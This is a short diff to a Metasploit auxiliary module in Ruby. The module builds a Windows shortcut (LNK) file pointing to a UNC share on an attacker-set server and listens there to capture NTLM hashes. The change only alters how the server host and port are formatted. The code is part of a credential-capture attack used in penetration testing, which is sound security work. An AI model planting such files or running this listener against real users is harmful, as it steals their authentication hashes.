@@ -156,12 +156,12 @@ class MetasploitModule < Msf::Auxiliary
     start_service
     unc_share = datastore['SHARE']
     unc_share = Rex::Text.rand_text_alphanumeric(6) if unc_share.blank?
-    unc_path = "\\\\#{srvhost}\\#{unc_share}"
+    unc_path = "\\\\#{datastore['SRVHOST']}\\#{unc_share}"
 
     lnk_data = ms_shllink(unc_path, app_name)
     file_create(lnk_data)
     print_good("LNK file created: #{datastore['FILENAME']}")
-    print_status("Listening for hashes on #{Rex::Socket.to_authority(bindhost, bindport)}")
+    print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
     stime = Time.now.to_f
     timeout = datastore['ListenerTimeout'].to_i
     loop do
